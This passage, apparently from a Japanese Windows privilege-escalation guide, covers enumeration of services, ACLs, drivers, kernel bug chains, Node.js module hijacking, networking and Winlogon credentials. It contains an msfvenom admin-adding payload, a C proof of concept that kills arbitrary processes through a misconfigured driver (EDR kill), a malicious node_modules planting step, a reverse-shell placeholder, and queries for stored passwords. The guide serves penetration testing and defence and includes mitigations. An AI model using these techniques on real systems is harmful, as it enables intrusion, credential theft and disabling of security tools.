gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitでこの脆弱性を検出して悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploitでサービスバイナリを手動で作成することもできます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指定するように設定できます。このバイナリを置き換え可能な場合、権限昇格が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプト対象

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` に加えて、**action arguments** で指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を指定する場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しが直接記述されている場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルのチェーン処理は手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリは、設定されたタスクのプリンシパルが呼び出し元と異なり、タスクが実際にそのアクションに到達する場合に限り、アカウントをまたいだ実行の手掛かりになります。スクリプトでは追記のみ可能な ACL が問題になることがありますが、それ以前の `exit` やその他の制御フローによって、追記した行が到達不能になる場合があります。権限昇格を主張する前に、有効な ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを開始したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFS では、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれていても、通常のディレクトリ一覧にはその内容が表示されないことがあります。アクセス可能なバックアップファイルや設定ファイルのうち、関連性のある少数のファイルについては、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) と PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) でストリームを確認できます。秘密情報を示唆するストリーム名は、あくまで手掛かりです。ファイルに対する実効的な読み取りアクセス、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、またその認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームのスキャンやストリーム内容の表示を避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールタスクまたはサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスによって、そのアカウントのコンテキストでコマンドを実行できる可能性があります。特権ユーザーがこれらのファイルを読み込むこと、および**両方**のサイドカーファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

スケジュールされたタスクについては、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこから入力を読み込む証明にはなりません。プロジェクトの作業ファイルが存在するという前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリのアクセス権**（上書きして権限昇格できる場合があります）と**フォルダーのアクセス権**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、`C:\Windows\Temp` にコマンドファイルを書き込み、置き換えに失敗した場合に既存の書き込み保護ファイルを実行していた、古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストール済みの正確なパッチレベルと、影響を受ける agent の操作が実行可能かを確認してください。`2.1` のようなブランチのみの表記では、影響の有無を判断できません。列挙では、ファイルを作成したり agent コマンドを実行したりせずに、バージョン、サービス状態、Temp のアクセス許可を調べられます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は、ADSelfService Plus の build 6210 以前に影響し、ベンダーは build 6211 で修正しました。この問題が関係するのは、SAML SSO が有効になっている、または過去に有効だった場合に限られます。そのため、インストール済み製品の項目やサービスパスは手がかりにすぎず、脆弱性の確証ではありません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。サービス経由の code execution は、そのアカウントの権限を引き継ぎます。SYSTEM 権限での実行には、SYSTEM で動作するインスタンスが必要です。製品の Backup ディレクトリに読み取り可能な `OfflineBackup_*.ezip` があっても、それは別個の暗号化バックアップに関する手がかりであり、利用可能な credential やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権を記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows 上の Jenkins controller では、job の作成・設定権限と、job の開始権限を区別してください。[Jenkins ではこれらを別個の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別の build 経路になることもありますが、それが有効で、実際に build が実行されることを確認してください。実行時の identity は controller または選択した agent のものです。また、保存された credential は、job がその scope にアクセスできる場合にのみ使用できます。これとは別に、`JENKINS_HOME` の metadata へのアクセス権を調べてください。Jenkins は `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に credential の情報と暗号鍵を保持します（[Jenkins の secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。それらが存在するだけでは password が判明したことにはなりません。共有出力に secret を表示せず、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認してください。そのアカウントに AD user-object の `scriptPath` 書き込み権限がある場合は、書き込み可能な script path と、対象ユーザーとして実行される実際の logon または scheduled consumer の両方を確認してから、ユーザー間の実行経路と判断してください。さらに group を制御できるかどうかは、実効 AD 権限を個別に確認する必要があります。

#### Azure Pipelines self-hosted agent の identity

Azure DevOps Server または Azure Pipelines の project では、pipeline の**作成・編集**権限と、pipeline の**queue**および選択した agent pool の使用権限を区別してください。[Microsoft は pipeline 権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)をそれぞれ別個に説明しています。低権限アカウントが script step を送信し、その pipeline を self-hosted Windows agent 上で実行できる場合、その step は[agent に設定された operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザー間または SYSTEM への権限移行を主張する前に、正確な pipeline、branch/resource の制限、認可された pool、実行可能な job、agent service の identity を確認してください。agent のインストール、project role、repository への書き込み権限だけでは、いずれも手がかりにすぎません。受動的な列挙中に build を開始せず、権限とローカルの service metadata を確認してください。

#### Microsoft Entra Connect Sync credentials

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL database にアクセスする **ADSync service account** と、権限が設定済みの同期機能に応じて異なる **AD DS connector account** を区別しています。connector credentials はその database 内に暗号化して保存され、鍵の情報は[ADSync service account の DPAPI によって保護されます](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル administrator を連想させる group があること、database が見えることだけでは、復号可能な credential やドメインへの権限昇格が確認されたことにはなりません。実際の database 読み取り権限、service account と鍵へのアクセス権、インストール先と SQL の配置、設定済みの connector identity、その identity の実効 AD 権限を個別に確認してください。通常の列挙では、サービスとアクセスの metadata のみを表示し、保存された secret を照会したり表示したりしないでください。

#### プリンタードライバーの support DLL のアクセス許可

インストール済みのプリンタードライバーは、`C:\ProgramData` に support DLL を保持し、より高い権限を持つ print process 内で読み込む場合があります。printer WMI の列挙が拒否されても、親ディレクトリと reparse point を含め、該当するドライバーのディレクトリと DLL の ACL を確認してください。[Ricoh printer-driver の問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みが説明されています。書き込み可能な ACL は手がかりにすぎません。拒否エントリーを考慮した実効書き込み権限、該当するドライバーがインストールされていて特権 identity でファイルを読み込むかどうか、ベンダーの更新済みドライバーまたはセキュリティプログラムによってインストール環境が修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから、脆弱性があると判断しないでください。

### 書き込み権限

一部の config file を変更して特別な file を読み取れるか、または Administrator account によって実行される binary（schedtasks）を変更できるかを確認してください。

システム内の権限が不適切な folder/file を見つける方法の 1 つは、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload による永続化/実行

Notepad++ は、`plugins` サブフォルダ内のすべてのプラグイン DLL を自動ロードします。書き込み可能なポータブル版またはコピー版がある場合、悪意のあるプラグインを配置すると、起動するたびに `notepad++.exe` 内でコードが自動実行されます（`DllMain` やプラグインのコールバックからも実行できます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時の実行

**別のユーザーによって実行されるレジストリやバイナリを上書きできるか確認してください。**\
**権限昇格に利用できる興味深い autoruns の場所について詳しく知るには、次のページを読んでください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審な/脆弱な**ドライバーがないか探してください

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られるもの）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel exploitation 関連の資料：

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅くする（最大長の component や深い directory chain を使う）ことで、競合可能な時間を数マイクロ秒から数十マイクロ秒に延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel の LPE chain の中には、単体では弱い2つの bug を組み合わせて構築できるものがあります。1つは、queue lock がまだ保持されている間に request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を漏えいさせる **lock-release-before-copy** disclosure です。<sup>[[29]](#references)</sup>

監査と exploitation に関する注意点：

- **ロック中に解放し、その後 cancel**：成功パスが **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探してください。成功パスが CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後で再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- **解放済みの queue object を再利用**：同じサイズの attacker-controlled な paged-pool allocation で reclaim します。`NPFS` Data Queue Entry は payload と size を制御でき、後で pipe read/peek operation で調べられるため有用です。解放済みの object に list link が含まれる場合は、それらを user memory 内の **循環する fake request node のリスト**で上書きし、元の list head で終了させずに、ドライバーに attacker-defined な request structure を繰り返し処理させます。
- **予測可能な write を拡張**：fake request によって bookkeeping write（timestamp / QPC / refcount 付近の field）で使われる nested context pointer を変更できる場合、**address は制御できるが value は制御できない** kernel write を得られる可能性があります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、corrupted object によって **out-of-bounds paged-pool read** が起きるまで spray を列挙します。
- **race 可能な disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、どれも有力な候補です。攻撃者がコピーされる buffer を大きくできる場合（たとえば serializer の最終 allocation size を増やす list/resource entry を多数追加するなど）、machine をクラッシュさせずにコピー時間を延ばし、置き換え可能な時間を広げられるため、信頼性が向上します。
- **pointer の多い refill target**：Windows **I/O ring** の registered-buffer array は優れた disclosure target です。paged-pool の size を攻撃者が制御でき（`8 * regBufferCnt`）、各 element は `_IOP_MC_BUFFER_ENTRY` への kernel pointer です。array を1つ漏えいさせ、周囲の `IORING_OBJECT` を特定したら、**`RegBuffers`** と **`RegBuffersCount`** を破壊し、後続の I/O ring operation に attacker-forged entry を使わせて任意の kernel read/write を実現します。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14`）しか得られない場合は、**重なり合う unaligned write** を使って `0x0101010101010101` のような同じ byte の繰り返しからなる user pointer を構築し、`VirtualAlloc` で map して、その場所に偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグ時に役立つ指標：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive workflow を使って SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive 脆弱性では、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU の子孫キーを悪用することで、カスタムドライバーを使わずにメタデータ破損を kernel paged-pool overflow に変換できます。完全な攻撃チェーンはこちらを参照してください。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる `RtlQueryRegistryValues` の direct-mode type confusion

一部のドライバーは userland からレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出し、`RTL_QUERY_REGISTRY_DIRECT` を使って `int readValue` のようなスタック上のスカラーに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に従って解釈されます。

これにより、次の2つの有用なプリミティブが得られます。<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` を使って、ドライバーに攻撃者が選んだキーをクエリさせ、戻り値やログを通じてキーの存在を漏らせます。また、呼び出し元が直接アクセスできない値を読み取れる場合もあります。
- **Kernel memory corruption**: `&readValue` のようなスカラーの書き込み先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定付きのバイナリバッファとして誤った型で解釈されます。

実践的な悪用に関する注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive**にアクセスすると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能性を維持するには、値を `HKCU` に配置するのではなく、**信頼されたシステム hive 内の攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive へのステージング**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子孫キーを列挙し、複製した**低 integrity** token を使って再スキャンし、sandbox 化されたコンテキストからアクセスできるキーを見つけます。<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int`への8-byteの直接書き込みは、隣接するスタックデータを破損させ、近くのcallback/function pointerを部分的に上書きする可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが攻撃者の制御下にある`REG_DWORD`をスタック上のスカラーに読み込み、その後、同じバッファを文字列読み込みに再利用すると、攻撃者は`Length` / `MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、半制御状態のkernel writeが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファサイズとして扱います。先行する`REG_DWORD`読み込みによって、攻撃者が制御する**負の値**が再利用されるスカラーに残っていると、次の`REG_BINARY`クエリは攻撃者のバイト列を隣接するスタックスロットに直接コピーします。これは、callback-pointerを完全に上書きする最も簡潔な方法であることがよくあります。

強力な調査パターン: **同じスタック変数への、再初期化を伴わない異種レジストリ読み込み**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、および最初のレジストリ読み込みが2回目の読み込みの実行可否を決めるコードパスをgrepしてください。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPEN設定漏れの悪用（LPE + EDR kill）

一部の署名済みサードパーティ製ドライバーは、IoCreateDeviceSecureで強力なSDDLを指定してデバイスオブジェクトを作成しますが、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れています。このフラグがない場合、余分なコンポーネントを含むパス経由でデバイスを開く際に、セキュアDACLが適用されません。そのため、権限のないユーザーでも、次のようなnamespace pathを使ってハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile （実際の事例）

ユーザーがデバイスを開けるようになると、ドライバーが公開している特権IOCTLを悪用してLPEや改ざんを行えます。実環境で確認された機能の例:
- 任意のプロセスへのフルアクセスハンドルを返す（token theft / DuplicateTokenEx/CreateProcessAsUser経由のSYSTEM shell）。
- 制限のないraw disk read/write（オフライン改ざん、起動時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスを終了する。これにより、kernel経由でuser landからAV/EDR killが可能になります。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLでアクセスを制限するデバイスオブジェクトを作成する際は、必ずFILE_DEVICE_SECURE_OPENを設定してください。
- 特権操作を行う呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPLチェックを追加してください。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネル特権を直接使用する代わりに、ブローカーを介する方式を検討してください。

防御側の検出アイデア
- 不審なデバイス名（例：\\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示唆する特定のIOCTLシーケンスを監視してください。
- Microsoftの脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストを維持してください。


## PATH DLL Hijacking

**PATH上のフォルダー内に書き込み権限**がある場合、プロセスが読み込むDLLをハイジャックし、**権限昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH内のすべてのフォルダーのアクセス許可を確認します：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron モジュール解決 hijacking

これは、期待されるモジュールが**見つからない**ときに、`require("foo")` のような bare import を行う **Node.js** および **Electron** アプリケーションに影響する、**Windows の制御されない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリの `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートに達することがあるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に調べる可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を仕込み、**より高い権限で実行される Node/Electron プロセス**が、見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行される場合、昇格されたスケジュールタスク／サービスラッパーから実行される場合、または特権を持つデスクトップアプリとして自動起動される場合、これは **LPE** につながります。

特に次のような場合によく見られます。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- パッケージが本番ビルドから削除された、パッケージ化時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い階層にある

### 脆弱な対象を探す

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` に `node_modules` が `contains` される条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` で最後に成功したオープンに注目する

展開済み `.asar` ファイルやアプリケーションのソースで確認するとよいコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースレビューから**不足しているパッケージ名**を特定します。
2. 存在しない場合は、ルートの検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 期待される名前と完全に一致するモジュールを配置します:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者のアプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込むことがあります。

このパターンに当てはまる、実際に使われているオプションモジュールの例には `bluebird` や `utf-8-validate` があります。ただし、再利用可能な部分は**手法**です。特権で動作する Windows の Node/Electron プロセスが解決する、任意の**存在しない bare import**を探してください。

### 検出と対策のアイデア

- ユーザーが `C:\node_modules` を作成したり、新しい `.js` ファイルやパッケージを書き込んだりした場合にアラートを出す。
- 高い整合性レベルで動作するプロセスが `C:\node_modules\*` から読み込んでいないか調査する。
- 本番環境ではすべてのランタイム依存関係をパッケージに含め、`optionalDependencies` の使用状況を監査する。
- サードパーティ製コードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認する。
- ライブラリが対応している場合は、オプションのプローブを無効にする（たとえば、一部の `ws` の構成では `WS_NO_UTF_8_VALIDATE=1` を指定すると、レガシーな `utf-8-validate` のプローブを回避できます）。

## ネットワーク

### 共有フォルダー

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts ファイル

hosts ファイルにハードコードされている、ほかの既知のコンピューターを確認する】【。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する】【。

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールタスクと照合します。リモート制御サービスでデスクトップユーザーとしてアクセスできるのは、その認証とコマンド制御がそれを許可する場合に限られます。より高い権限のアカウントで動作するカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手掛かりにすぎず、認証済みのメモリ破損経路を確認するには、その正確なバイナリと到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に[`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)と照合します。転送ルールがあるだけでは、転送先に到達可能であることや脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォールルール

[**ファイアウォール関連のコマンドはこちらを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化など）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` でポートを listen するとき、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash を root として簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで `WSL` のファイルシステムを確認できます。

WSL 内の Linux `root` 権限だけでは、Windows の Administrator 権限は得られません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドによって認証情報が記録されている可能性があるシェル履歴ファイル（`/root/.bash_history` を含む）を確認してください。権限昇格には、引き続き有効な高権限アカウントと許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに適用されます。WSL 2 では通常、ディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙中に履歴の内容を出力しないでください。

## Windows Credentials

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

